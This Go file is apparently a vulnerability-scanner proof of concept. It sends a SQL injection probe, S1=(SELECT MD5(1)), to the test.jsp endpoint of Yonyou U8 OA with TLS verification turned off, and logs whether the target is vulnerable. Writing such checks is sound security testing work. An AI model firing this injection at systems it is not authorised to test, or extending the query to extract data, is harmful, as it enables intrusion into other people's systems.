package poc

import (
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func U8OAtestSQLi(target string) {
	url := strings.TrimRight(target, "/")
	req, err := http.NewRequest("GET", url+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))", nil)
	if err != nil {
		log.Println(err)
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	tag := regexp.MustCompile("c4ca4238a0b923820dcc509a6f75849b").MatchString(string(body))
	if resp.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在U8 OA test SQL注入漏洞：", url+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))")
	} else {
		log.Println("[-] 不存在U8 OA test SQL注入漏洞")
	}
}
